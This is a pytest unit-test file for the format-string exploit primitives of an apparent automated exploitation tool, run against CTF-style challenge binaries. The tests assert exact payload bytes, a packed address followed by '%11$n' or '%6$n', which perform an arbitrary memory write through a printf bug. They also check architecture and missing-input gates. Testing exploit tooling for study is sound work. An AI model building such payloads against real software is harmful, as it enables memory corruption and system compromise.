"""Unit tests for ``autopwn.primitives.fmtstr`` (P6.7).

Per ``rebuild.md`` §6.7 P6.9 + §6.7 P6.7: every primitive needs
``build_payload(ctx) -> bytes`` asserted against a fake
address.  P6.7 has 2 primitives (``FmtstrX32`` + ``FmtstrX64``)
sharing the same shape::

    [pNN(buf_addr)] [b'%'] [str(offset).encode()] [b'$n']

The bit-width determines the encoder (x32 → ``p32``, x64 → ``p64``);
``offset`` and ``buf_addr`` are read from the run context
(``ctx.fmtstr_offset`` / ``ctx.fmtstr_buf``), populated by
P5.2 ``find_offset`` + P4.5 ``find_bss``.

Test plan
---------
* :class:`FmtstrX32`:
    * ``name`` + ``stage_count()`` = 1 (single-stage; no leak)
    * x64 bit-width gate (wrong bit → ``b""``)
    * ``fmtstr_offset`` is ``None`` → ``b""``
    * ``fmtstr_buf`` is ``None`` → ``b""``
    * ``offset <= 0`` → ``b""``
    * Happy path (offset=11, buf=0x804a050):
      - payload length = 4 + 1 + 2 + 2 = 9 bytes
      - payload starts with ``p32(0x804a050)``
      - payload ends with ``b'%11$n'``
* :class:`FmtstrX64`:
    * ``name`` + ``stage_count()`` = 1
    * x32 bit-width gate (wrong bit → ``b""``)
    * Same missing-input gates as x32
    * Happy path (offset=6, buf=0x404060):
      - payload length = 8 + 1 + 1 + 2 = 12 bytes
      - payload starts with ``p64(0x404060)``
      - payload ends with ``b'%6$n'``
* :func:`_resolve_fmtstr_inputs`:
    * Both populated → returns tuple
    * Either missing → returns ``(None, None)``
    * ``offset <= 0`` → returns ``(None, None)``
* Real-binary smoke: 5 binary × 2 arch = 10 tests
    * All ``b""`` because the run context has no
      ``fmtstr_offset``/``fmtstr_buf`` populated (P5.2 / P4.5
      are P5/P4 layer concerns, not P6.7)
"""
from __future__ import annotations

import pytest

from tests.conftest import ctx_for


pytestmark = pytest.mark.primitive


# Fake BSS addresses for synthetic happy-path tests.
# Picked to be visually distinct in hex dumps.
_FAKE_BUF_32 = 0x0804A050  # typical x32 BSS address
_FAKE_BUF_64 = 0x404060    # typical x64 BSS address

# Fake fmtstr offsets (the 1-based position at which user input
# appears on the stack; from P5.2 ``find_offset``).
_FAKE_OFFSET_32 = 11  # fmtstr1's typical offset
_FAKE_OFFSET_64 = 6   # level3_x64's typical offset


class TestFmtstrX32Metadata:
    """Class-level invariants for ``FmtstrX32``."""

    def test_name_is_canonical(self):
        from autopwn.primitives.fmtstr import FmtstrX32

        assert FmtstrX32.name == "fmtstr-x32"

    def test_stage_count_is_one(self):
        """Format-string write is single-stage — no leak, no second stage."""
        from autopwn.primitives.fmtstr import FmtstrX32

        assert FmtstrX32().stage_count() == 1

    def test_subclass_of_exploit_primitive(self):
        from autopwn.primitives.base import ExploitPrimitive
        from autopwn.primitives.fmtstr import FmtstrX32

        assert issubclass(FmtstrX32, ExploitPrimitive)

    def test_re_exported_from_primitives_package(self):
        from autopwn.primitives import FmtstrX32 as Re

        from autopwn.primitives.fmtstr import FmtstrX32

        assert Re is FmtstrX32

    def test_in_primitives_all(self):
        from autopwn.primitives import __all__

        assert "FmtstrX32" in __all__


class TestFmtstrX64Metadata:
    """Class-level invariants for ``FmtstrX64``."""

    def test_name_is_canonical(self):
        from autopwn.primitives.fmtstr import FmtstrX64

        assert FmtstrX64.name == "fmtstr-x64"

    def test_stage_count_is_one(self):
        from autopwn.primitives.fmtstr import FmtstrX64

        assert FmtstrX64().stage_count() == 1

    def test_subclass_of_exploit_primitive(self):
        from autopwn.primitives.base import ExploitPrimitive
        from autopwn.primitives.fmtstr import FmtstrX64

        assert issubclass(FmtstrX64, ExploitPrimitive)

    def test_re_exported_from_primitives_package(self):
        from autopwn.primitives import FmtstrX64 as Re

        from autopwn.primitives.fmtstr import FmtstrX64

        assert Re is FmtstrX64

    def test_in_primitives_all(self):
        from autopwn.primitives import __all__

        assert "FmtstrX64" in __all__


class TestFmtstrX32Payload:
    """``FmtstrX32.build_payload(ctx)`` happy-path and edge cases."""

    def test_happy_path_payload_shape(self):
        """x32 happy path: ``p32(buf) + b'%11$n'`` → 9-byte payload."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = _FAKE_OFFSET_32
        ctx.fmtstr_buf = _FAKE_BUF_32
        payload = FmtstrX32().build_payload(ctx)
        assert len(payload) == 9
        assert payload == b"\x50\xa0\x04\x08" + b"%11$n"
        # First 4 bytes are p32(0x804a050)
        assert payload[:4] == b"\x50\xa0\x04\x08"
        # Last 5 bytes are the format string
        assert payload[4:] == b"%11$n"

    def test_returns_empty_for_x64_binary(self):
        """x32 primitive must refuse x64 targets (use FmtstrX64 instead)."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("level3_x64", bit=64)
        ctx.fmtstr_offset = _FAKE_OFFSET_32
        ctx.fmtstr_buf = _FAKE_BUF_32
        payload = FmtstrX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_fmtstr_offset_is_none(self):
        """``ctx.fmtstr_offset`` is None → ``b""`` (P5.2 didn't run)."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = None
        ctx.fmtstr_buf = _FAKE_BUF_32
        payload = FmtstrX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_fmtstr_buf_is_none(self):
        """``ctx.fmtstr_buf`` is None → ``b""`` (P4.5 didn't find BSS)."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = _FAKE_OFFSET_32
        ctx.fmtstr_buf = None
        payload = FmtstrX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_offset_is_zero(self):
        """``offset=0`` is invalid (1-based) → ``b""``."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = 0
        ctx.fmtstr_buf = _FAKE_BUF_32
        payload = FmtstrX32().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_offset_is_negative(self):
        """``offset<0`` is invalid → ``b""``."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = -1
        ctx.fmtstr_buf = _FAKE_BUF_32
        payload = FmtstrX32().build_payload(ctx)
        assert payload == b""

    def test_offset_with_three_digits(self):
        """3-digit offset (e.g. 100) → payload length = 4 + 1 + 3 + 2 = 10."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = 100
        ctx.fmtstr_buf = _FAKE_BUF_32
        payload = FmtstrX32().build_payload(ctx)
        assert len(payload) == 10
        assert payload == b"\x50\xa0\x04\x08" + b"%100$n"


class TestFmtstrX64Payload:
    """``FmtstrX64.build_payload(ctx)`` happy-path and edge cases."""

    def test_happy_path_payload_shape(self):
        """x64 happy path: ``p64(buf) + b'%6$n'`` → 12-byte payload."""
        from autopwn.primitives.fmtstr import FmtstrX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.fmtstr_offset = _FAKE_OFFSET_64
        ctx.fmtstr_buf = _FAKE_BUF_64
        payload = FmtstrX64().build_payload(ctx)
        assert len(payload) == 12
        assert payload == b"\x60\x40\x40\x00\x00\x00\x00\x00" + b"%6$n"
        # First 8 bytes are p64(0x404060)
        assert payload[:8] == b"\x60\x40\x40\x00\x00\x00\x00\x00"
        # Last 4 bytes are the format string
        assert payload[8:] == b"%6$n"

    def test_returns_empty_for_x32_binary(self):
        """x64 primitive must refuse x32 targets (use FmtstrX32 instead)."""
        from autopwn.primitives.fmtstr import FmtstrX64

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = _FAKE_OFFSET_64
        ctx.fmtstr_buf = _FAKE_BUF_64
        payload = FmtstrX64().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_fmtstr_offset_is_none(self):
        from autopwn.primitives.fmtstr import FmtstrX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.fmtstr_offset = None
        ctx.fmtstr_buf = _FAKE_BUF_64
        payload = FmtstrX64().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_fmtstr_buf_is_none(self):
        from autopwn.primitives.fmtstr import FmtstrX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.fmtstr_offset = _FAKE_OFFSET_64
        ctx.fmtstr_buf = None
        payload = FmtstrX64().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_when_offset_is_zero(self):
        from autopwn.primitives.fmtstr import FmtstrX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.fmtstr_offset = 0
        ctx.fmtstr_buf = _FAKE_BUF_64
        payload = FmtstrX64().build_payload(ctx)
        assert payload == b""


class TestResolveFmtstrInputs:
    """``_resolve_fmtstr_inputs(ctx) -> (buf, offset) | (None, None)``."""

    def test_returns_tuple_when_both_populated(self):
        from autopwn.primitives.fmtstr import _resolve_fmtstr_inputs

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = 11
        ctx.fmtstr_buf = 0x804a050
        result = _resolve_fmtstr_inputs(ctx)
        assert result == (0x804a050, 11)

    def test_returns_none_pair_when_offset_missing(self):
        from autopwn.primitives.fmtstr import _resolve_fmtstr_inputs

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = None
        ctx.fmtstr_buf = 0x804a050
        result = _resolve_fmtstr_inputs(ctx)
        assert result == (None, None)

    def test_returns_none_pair_when_buf_missing(self):
        from autopwn.primitives.fmtstr import _resolve_fmtstr_inputs

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = 11
        ctx.fmtstr_buf = None
        result = _resolve_fmtstr_inputs(ctx)
        assert result == (None, None)

    def test_returns_none_pair_when_offset_zero(self):
        from autopwn.primitives.fmtstr import _resolve_fmtstr_inputs

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.fmtstr_offset = 0
        ctx.fmtstr_buf = 0x804a050
        result = _resolve_fmtstr_inputs(ctx)
        assert result == (None, None)


class TestFmtstrRealBinarySmoke:
    """Real-binary smoke: 5 Challenge/ binaries × 2 architectures = 10 tests.

    All should return ``b""`` because the bare ``ctx_for()`` factory
    doesn't populate ``fmtstr_offset`` / ``fmtstr_buf`` (those are
    P5.2 / P4.5 layer concerns, not P6.7's).  This confirms the
    gate logic doesn't crash on real files.
    """

    @pytest.mark.parametrize("binary,bit", [
        ("fmtstr1", 32),
        ("canary", 32),
        ("level3_x64", 64),
        ("pie", 64),
        ("rip", 64),
    ])
    def test_fmtstrx32_returns_empty(self, binary, bit):
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for(binary, bit=bit)
        assert FmtstrX32().build_payload(ctx) == b""

    @pytest.mark.parametrize("binary,bit", [
        ("fmtstr1", 32),
        ("canary", 32),
        ("level3_x64", 64),
        ("pie", 64),
        ("rip", 64),
    ])
    def test_fmtstrx64_returns_empty(self, binary, bit):
        from autopwn.primitives.fmtstr import FmtstrX64

        ctx = ctx_for(binary, bit=bit)
        assert FmtstrX64().build_payload(ctx) == b""

    @pytest.mark.parametrize("binary,bit", [
        ("fmtstr1", 32),
        ("canary", 32),
        ("level3_x64", 64),
        ("pie", 64),
        ("rip", 64),
    ])
    def test_fmtstrx32_returns_empty_with_garbage_inputs(self, binary, bit):
        """Even with garbage fmtstr fields, primitive should not crash."""
        from autopwn.primitives.fmtstr import FmtstrX32

        ctx = ctx_for(binary, bit=bit)
        # Force-set garbage values
        ctx.fmtstr_offset = -1
        ctx.fmtstr_buf = 0xDEADBEEF
        assert FmtstrX32().build_payload(ctx) == b""
